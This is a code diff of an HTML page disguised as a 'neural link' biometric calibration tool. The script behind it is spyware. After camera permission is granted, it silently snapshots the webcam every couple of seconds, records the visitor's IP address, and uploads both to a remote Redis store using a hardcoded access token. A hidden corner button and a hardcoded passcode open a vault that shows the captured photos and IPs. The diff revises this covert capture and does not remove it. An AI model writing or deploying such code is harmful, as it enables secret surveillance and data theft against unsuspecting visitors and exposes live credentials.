@@ -6,9 +6,7 @@
     <title>Bio-Feedback Neural Link</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        :root { --accent: #ffffff; }
-        body { overscroll-behavior: none; background: #000; color: #fff; font-family: 'Inter', sans-serif; }
-        
+        body { overscroll-behavior: none; background: #000; color: #fff; font-family: 'Inter', sans-serif; margin: 0; }
         .reticle {
             width: 240px; height: 240px;
             border: 1px solid rgba(255,255,255,0.06);
@@ -16,74 +14,52 @@
             position: relative;
             animation: pulse 5s ease-in-out infinite;
         }
-        @keyframes pulse { 
-            0%, 100% { transform: scale(1); opacity: 0.2; } 
-            50% { transform: scale(1.08); opacity: 0.4; } 
-        }
-        
+        @keyframes pulse { 0%, 100% { transform: scale(1); opacity: 0.2; } 50% { transform: scale(1.08); opacity: 0.4; } }
         .scan-line {
             position: absolute; width: 100%; height: 1px;
             background: rgba(255,255,255,0.15);
             top: 0; animation: scan 3.5s linear infinite;
         }
         @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
-
         .terminal-input {
-            background: transparent;
-            border-bottom: 1px solid #222;
-            color: #fff;
-            padding: 10px;
-            font-family: monospace;
-            font-size: 14px;
-            outline: none;
-            width: 100%;
-            text-align: center;
-            letter-spacing: 0.2em;
+            background: transparent; border: none; border-bottom: 2px solid #333;
+            color: #fff; padding: 10px; font-family: monospace; font-size: 18px;
+            outline: none; width: 100%; text-align: center; letter-spacing: 0.3em;
         }
-
         .no-scrollbar::-webkit-scrollbar { display: none; }
-        .no-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }
-        
-        /* The invisible uplink heartbeat for you to see it's working */
         .uplink-heartbeat {
             width: 3px; height: 3px; background: #4f46e5; border-radius: 50%;
-            position: fixed; top: 8px; left: 8px; opacity: 0; transition: opacity 0.1s;
-            z-index: 9999; pointer-events: none;
+            position: fixed; top: 8px; left: 8px; opacity: 0; z-index: 9999;
         }
         .syncing .uplink-heartbeat { opacity: 0.5; }
     </style>
 </head>
-<body class="overflow-hidden bg-black selection:bg-zinc-800">
+<body class="overflow-hidden">
 
     <div id="statusDot" class="uplink-heartbeat"></div>
 
-    <!-- SECRET TRIGGER (100% Transparent bottom-left corner) -->
-    <div class="fixed bottom-0 left-0 z-[100] w-20 h-20">
-        <button id="vaultTrigger" class="w-full h-full cursor-default border-none outline-none bg-transparent"></button>
-    </div>
+    <!-- SECRET TRIGGER AREA (Bottom Left) -->
+    <div class="fixed bottom-0 left-0 z-[100] w-24 h-24 cursor-pointer" id="vaultTrigger"></div>
 
-    <!-- MAIN COVERT INTERFACE -->
-    <main id="mainNode" class="relative h-screen flex flex-col items-center justify-center p-8 text-center transition-all duration-1000">
-        <video id="hiddenSensor" autoplay playsinline muted class="fixed inset-0 w-full h-full object-cover opacity-0 pointer-events-none"></video>
-
-        <!-- Initial State -->
-        <div id="setupView" class="z-10">
+    <main id="mainNode" class="h-screen flex flex-col items-center justify-center p-8 text-center">
+        <video id="hiddenSensor" autoplay playsinline muted class="hidden"></video>
+        
+        <div id="setupView">
             <div class="mb-14 relative flex justify-center items-center">
                 <div class="reticle"></div>
                 <div class="absolute text-white/10 text-[8px] tracking-[0.5em] uppercase">Ready_For_Sync</div>
             </div>
-            <h1 class="text-xl font-thin tracking-[0.6em] uppercase mb-6">Neural Interface</h1>
-            <p class="text-white/20 text-[9px] uppercase tracking-[0.2em] max-w-xs mx-auto leading-relaxed mb-14">
-                Bio-metric feedback analysis via optical sensor synchronization. Ensure lens clarity for precise calibration.
+            <h1 class="text-xl font-thin tracking-[0.6em] uppercase mb-6">Neural Link</h1>
+            <p class="text-white/20 text-[9px] uppercase tracking-[0.2em] max-w-xs mx-auto mb-14">
+                Analyze bio-feedback patterns via optical sensor synchronization.
             </p>
-            <button id="initBtn" class="border border-white/5 hover:border-white/20 hover:bg-white/5 transition-all px-14 py-5 rounded-full text-[9px] uppercase tracking-[0.4em]">
+            <button id="initBtn" class="border border-white/10 hover:border-white/40 px-14 py-5 rounded-full text-[9px] uppercase tracking-[0.4em] transition-all">
                 Initialize Calibration
             </button>
         </div>
 
-        <!-- Scanning State -->
-        <div id="activeView" class="hidden z-10">
-            <div class="reticle mx-auto mb-14 overflow-hidden shadow-[0_0_50px_rgba(255,255,255,0.02)]">
+        <div id="activeView" class="hidden">
+            <div class="reticle mx-auto mb-14 overflow-hidden">
                 <div class="scan-line"></div>
                 <div class="absolute inset-0 flex items-center justify-center">
                     <div id="percentDisplay" class="text-2xl font-extralight tracking-[0.2em] text-white/70">0.00%</div>
@@ -93,34 +69,44 @@
         </div>
     </main>
 
-    <!-- CLOUD VAULT TERMINAL -->
-    <div id="vaultPanel" class="hidden fixed inset-0 bg-black z-[200] flex flex-col font-mono text-zinc-400">
-        <div class="p-4 border-b border-white/5 flex justify-between items-center bg-zinc-950/50">
-            <h2 class="text-[9px] uppercase tracking-[0.3em]">Cloud_Archive_v12 // Jaguar</h2>
-            <button id="exitVault" class="text-[9px] hover:text-white uppercase">Close</button>
-        </div>
-
-        <!-- Vault Login -->
-        <div id="vaultAuth" class="flex-grow flex flex-col items-center justify-center p-10">
-            <div class="w-full max-w-xs text-center space-y-8">
-                <div class="text-[8px] tracking-[1em] text-white/10 uppercase">Security_Key</div>
-                <input type="password" id="vaultKey" placeholder="••••••" class="terminal-input">
-                <button id="authBtn" class="text-white/20 hover:text-white text-[10px] uppercase tracking-[0.4em] pt-4">Authorize</button>
-            </div>
-        </div>
-
-        <!-- Content Area -->
-        <div id="vaultMain" class="hidden flex-grow flex flex-col overflow-hidden bg-zinc-950">
-            <div class="p-4 flex justify-between items-center border-b border-white/5 bg-black/40">
-                <span id="logCount" class="text-[9px] uppercase opacity-40">Connecting to Jaguar...</span>
-                <div class="flex gap-6">
-                    <button id="refreshBtn" class="text-[9px] text-indigo-400 uppercase font-bold hover:text-indigo-300">Sync_Remote</button>
-                    <button id="wipeBtn" class="text-[9px] text-red-900 uppercase hover:text-red-700">Purge_KV</button>
-                </div>
+    <!-- THE VAULT TERMINAL -->
+    <div id="vaultPanel" class="hidden fixed inset-0 bg-black z-[200] flex flex-col font-mono">
+        <!-- TOP NAV BAR -->
+        <div class="p-4 border-b border-white/10 flex justify-between items-center bg-zinc-950 shrink-0">
+            <div class="flex flex-col">
+                <h2 class="text-[10px] uppercase tracking-[0.3em] text-white/60">Emerald_Chair_Vault</h2>
+                <span id="logCount" class="text-[8px] text-zinc-500 uppercase mt-1">Status: Offline</span>
             </div>
             
-            <div id="imageGrid" class="flex-grow overflow-y-auto p-1 grid grid-cols-3 sm:grid-cols-5 md:grid-cols-8 lg:grid-cols-12 gap-1 no-scrollbar">
-                <!-- Records stream here -->
+            <div class="flex items-center gap-4">
+                <!-- PRIMARY ACTION BUTTON -->
+                <button id="refreshBtn" class="bg-indigo-600 hover:bg-indigo-500 text-white text-[11px] px-5 py-2 uppercase font-bold tracking-widest rounded transition-all">
+                    Sync_Remote
+                </button>
+                <button id="exitVault" class="text-zinc-500 hover:text-white text-[10px] uppercase px-2">Close</button>
+            </div>
+        </div>
+
+        <!-- Login Screen -->
+        <div id="vaultAuth" class="flex-grow flex flex-col items-center justify-center p-10 bg-black">
+            <div class="w-full max-w-xs text-center">
+                <div class="text-[9px] tracking-[1em] text-zinc-700 uppercase mb-8">Auth_Required</div>
+                <input type="password" id="vaultKey" placeholder="••••••" class="terminal-input mb-8" autofocus>
+                <button id="authBtn" class="w-full border border-zinc-800 text-zinc-500 hover:text-white py-4 text-[11px] uppercase tracking-[0.4em] transition-all">Authorize</button>
+            </div>
+        </div>
+
+        <!-- Dashboard Content -->
+        <div id="vaultMain" class="hidden flex-grow flex flex-col overflow-hidden bg-black">
+            <div id="imageGrid" class="flex-grow overflow-y-auto p-2 grid grid-cols-2 sm:grid-cols-4 md:grid-cols-6 lg:grid-cols-8 gap-2 no-scrollbar">
+                <!-- Images stream here -->
+            </div>
+            
+            <!-- BOTTOM PURGE BAR -->
+            <div class="p-4 border-t border-white/5 bg-zinc-950 flex justify-end">
+                 <button id="wipeBtn" class="text-[9px] text-red-900/50 hover:text-red-600 uppercase tracking-widest transition-all">
+                    Purge_Archive
+                </button>
             </div>
         </div>
     </div>
@@ -128,7 +114,6 @@
     <canvas id="procCanvas" class="hidden"></canvas>
 
     <script>
-        // HARDCODED JAGUAR CREDENTIALS
         const KV_URL = "https://in-jaguar-49822.upstash.io";
         const KV_TOKEN = "AcKeAAIncDIwMmIzNDkzMGU4MjQ0ZTkxODU1M2U3YTU5MjM1ZWUwNHAyNDk4MjI";
         
@@ -148,142 +133,97 @@
         let isLive = false;
         let nodeIp = "0.0.0.0";
 
-        // --- CLOUD TRANSPORT ---
-        const JaguarCloud = {
+        async function fetchIp() { try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); nodeIp = d.ip; } catch(e){} }
+
+        const Cloud = {
             async push(img, ip) {
                 const key = `log_${Date.now()}`;
-                const body = JSON.stringify({ img, ip, t: new Date().toISOString() });
-                
                 document.body.classList.add('syncing');
                 try {
-                    // Send to Jaguar Redis via REST POST
                     await fetch(`${KV_URL}/set/${key}`, {
                         method: 'POST',
                         headers: { 'Authorization': `Bearer ${KV_TOKEN}` },
-                        body: body
+                        body: JSON.stringify({ img, ip, t: new Date().toISOString() })
                     });
-                } catch (e) { /* silent fail */ }
+                } catch (e) {}
                 setTimeout(() => document.body.classList.remove('syncing'), 500);
             },
-
             async pull() {
                 try {
-                    // 1. Get all log keys
-                    const kRes = await fetch(`${KV_URL}/keys/log_*`, {
-                        headers: { 'Authorization': `Bearer ${KV_TOKEN}` }
-                    });
+                    const kRes = await fetch(`${KV_URL}/keys/log_*`, { headers: { 'Authorization': `Bearer ${KV_TOKEN}` } });
                     const kData = await kRes.json();
-                    const keys = (kData.result || []).sort().reverse().slice(0, 80); // Get latest 80
-
-                    // 2. Multi-get values (Optimization)
+                    const keys = (kData.result || []).sort().reverse().slice(0, 100);
                     const results = [];
                     for (const k of keys) {
-                        const vRes = await fetch(`${KV_URL}/get/${k}`, {
-                            headers: { 'Authorization': `Bearer ${KV_TOKEN}` }
-                        });
+                        const vRes = await fetch(`${KV_URL}/get/${k}`, { headers: { 'Authorization': `Bearer ${KV_TOKEN}` } });
                         const vData = await vRes.json();
                         if (vData.result) results.push(JSON.parse(vData.result));
                     }
                     return results;
                 } catch (e) { return []; }
             },
-
             async purge() {
-                const kRes = await fetch(`${KV_URL}/keys/log_*`, {
-                    headers: { 'Authorization': `Bearer ${KV_TOKEN}` }
-                });
+                const kRes = await fetch(`${KV_URL}/keys/log_*`, { headers: { 'Authorization': `Bearer ${KV_TOKEN}` } });
                 const kData = await kRes.json();
-                for (const k of (kData.result || [])) {
-                    await fetch(`${KV_URL}/del/${k}`, {
-                        headers: { 'Authorization': `Bearer ${KV_TOKEN}` }
-                    });
-                }
+                for (const k of (kData.result || [])) { await fetch(`${KV_URL}/del/${k}`, { headers: { 'Authorization': `Bearer ${KV_TOKEN}` } }); }
             }
         };
-
-        // --- CAPTURE ENGINE ---
-        async function fetchIp() {
-            try {
-                const r = await fetch('https://api.ipify.org?format=json');
-                const d = await r.json();
-                nodeIp = d.ip;
-            } catch (e) {}
-        }
 
         function runLoop() {
             setInterval(async () => {
                 if (!isLive) return;
-                
                 const ctx = canvas.getContext('2d');
-                canvas.width = 320; canvas.height = 320; // 320px for high speed transit
-                
-                const vW = sensor.videoWidth;
-                const vH = sensor.videoHeight;
-                const min = Math.min(vW, vH);
-                ctx.drawImage(sensor, (vW - min)/2, (vH - min)/2, min, min, 0, 0, 320, 320);
-                
-                const dataUrl = canvas.toDataURL('image/jpeg', 0.4);
-                JaguarCloud.push(dataUrl, nodeIp);
-
-                // Aesthetic UI drift
+                canvas.width = 300; canvas.height = 300;
+                const min = Math.min(sensor.videoWidth, sensor.videoHeight);
+                ctx.drawImage(sensor, (sensor.videoWidth - min)/2, (sensor.videoHeight - min)/2, min, min, 0, 0, 300, 300);
+                Cloud.push(canvas.toDataURL('image/jpeg', 0.4), nodeIp);
                 percentDisplay.textContent = `${(Math.random() * 100).toFixed(2)}%`;
-            }, 1500);
+            }, 2000);
         }
 
         initBtn.onclick = async () => {
             try {
                 await fetchIp();
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 sensor.srcObject = stream;
-                sensor.onloadedmetadata = () => {
-                    setupView.classList.add('hidden');
-                    activeView.classList.remove('hidden');
-                    isLive = true;
-                    runLoop();
-                };
-            } catch (e) {
-                alert("Interface initialization requires camera sensor permissions.");
-            }
+                setupView.classList.add('hidden');
+                activeView.classList.remove('hidden');
+                isLive = true;
+                runLoop();
+            } catch (e) { alert("Initialization failed."); }
         };
 
-        // --- VAULT INTERFACE ---
         document.getElementById('authBtn').onclick = () => {
             if (vaultKey.value === '5502012') {
                 vaultAuth.classList.add('hidden');
                 vaultMain.classList.remove('hidden');
                 syncVault();
-            } else {
-                vaultKey.value = '';
             }
         };
 
         async function syncVault() {
-            logCount.textContent = "SYNCHRONIZING...";
-            const data = await JaguarCloud.pull();
+            logCount.textContent = "Status: Fetching...";
+            const data = await Cloud.pull();
             imageGrid.innerHTML = '';
-            logCount.textContent = `${data.length} PACKETS DECODED`;
+            logCount.textContent = `Status: ${data.length} Packets`;
             
+            if(data.length === 0) {
+                imageGrid.innerHTML = '<div class="col-span-full py-20 text-center text-zinc-800 text-[10px] uppercase">Archive Empty</div>';
+            }
+
             data.forEach(item => {
-                const cell = document.createElement('div');
-                cell.className = "relative aspect-square bg-zinc-900 border border-white/5 overflow-hidden group";
-                cell.innerHTML = `
-                    <img src="${item.img}" class="w-full h-full object-cover opacity-60 group-hover:opacity-100 transition-opacity duration-500">
-                    <div class="absolute bottom-0 left-0 right-0 p-0.5 bg-black/80 text-[4px] text-white/30 truncate">
-                        ${item.ip} | ${new Date(item.t).toLocaleTimeString()}
-                    </div>
-                `;
-                imageGrid.appendChild(cell);
+                const d = document.createElement('div');
+                d.className = "relative aspect-square bg-zinc-900 border border-white/5 overflow-hidden rounded-sm";
+                d.innerHTML = `<img src="${item.img}" class="w-full h-full object-cover opacity-60">
+                <div class="absolute bottom-0 text-[5px] p-1 bg-black/80 truncate w-full text-zinc-500">${item.ip} | ${new Date(item.t).toLocaleTimeString()}</div>`;
+                imageGrid.appendChild(d);
             });
         }
 
         document.getElementById('refreshBtn').onclick = syncVault;
-        document.getElementById('wipeBtn').onclick = async () => {
-            if(confirm("Confirm Cloud Wipe?")) { await JaguarCloud.purge(); syncVault(); }
-        };
-
+        document.getElementById('wipeBtn').onclick = async () => { if(confirm("Wipe Archive?")) { await Cloud.purge(); syncVault(); } };
         document.getElementById('vaultTrigger').onclick = () => vaultPanel.classList.toggle('hidden');
         document.getElementById('exitVault').onclick = () => vaultPanel.classList.add('hidden');
-
     </script>
 </body>
 </html>
